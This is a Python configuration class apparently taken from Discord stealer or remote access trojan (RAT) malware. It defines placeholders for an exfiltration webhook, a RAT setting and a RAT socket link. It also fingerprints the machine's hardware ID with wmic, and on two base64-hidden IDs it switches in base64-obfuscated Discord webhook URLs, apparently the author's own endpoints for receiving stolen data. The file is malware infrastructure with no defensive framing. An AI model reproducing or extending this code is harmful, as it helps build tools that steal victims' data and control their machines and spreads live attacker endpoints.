import subprocess
from base64 import b64decode

class Config:
    def __init__(self):
        self.eb_color = 'EB_COLOR' # remove
        self.eb_footer = 'EB_FOOTER' # remove 
        self.debug_mode = 'DEBUG_MODE'
        self.webhook = 'HOOK'
        self.wh_avatar = 'WH_AVATAR' # remove 
        self.wh_name = 'WH_NAME' # remove
        self.discord_rat = 'DISCORD_RAT'
        self.discord_rat_socket_link = 'DISCORD_RAT_SOCKET_LINK'
        
        # Developer Config, don't change, only if you know what you're doing
        self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        if self.hwid == b64decode(b'NUEyNTc2MkEtODlFNi04QTE4LUE1MjMtMDBEODYxQzc0NzU3').decode('UTF-8'):
            self.debug_mode = True
            self.webhook = b64decode(b'aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwODQxNTU5MjczMTUzNjYwMjgvT1pHZDE0LVZTbmdhajZvZGJ0Q3FfOTM0Z1phZFZsSWhZamJneXZhYzhWUEdPZ1pNclBTSzQ1MUFNMllHb1lsenpHdFk=').decode('UTF-8')
        if self.hwid == b64decode(b'Mzg0NDQzMzUtMzgzMi01NzMwLTM1MzktMzk1NzM4MzI0NDM1').decode('UTF-8'):
            self.debug_mode = True
            self.webhook = b64decode(b'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTA4NDU0MjkxNDk3NTI0ODM4NS9JNEdSMGM5N0dQRnVPZXkzMEJLajJKY3RrTDhtVlRpMVVMeUtzSF84OS1zV0V4bHpGSGNwQzVVc3l0NHBmT1djLXBpTg==').decode('UTF-8')
        
    def get_webhook(self):
        return self.webhook
        
    def get_color(self):
        return self.eb_color
    
    def get_footer(self):
        return self.eb_footer
    
    def get_debug_mode(self):
        return self.debug_mode
    
    def get_avatar(self):
        return self.wh_avatar
    
    def get_name(self):
        return self.wh_name
    
    def get_discord_rat_link(self):
        return self.discord_rat_socket_link
